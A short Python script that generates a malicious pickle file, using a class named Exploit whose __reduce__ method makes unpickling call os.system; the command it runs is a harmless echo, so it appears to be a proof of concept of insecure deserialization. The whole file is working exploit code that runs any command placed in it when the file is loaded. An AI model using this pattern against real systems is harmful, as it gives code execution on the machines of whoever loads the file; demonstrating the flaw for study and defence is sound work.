import pickle
import os


class Exploit:
    def __reduce__(self):
        return (os.system, ('echo Hacked by a pickle',))


if __name__ == "__main__":
    payload = Exploit()
    with open("payload.pkl", "wb") as f:
        pickle.dump(payload, f)
    print("payload.pkl generated.")
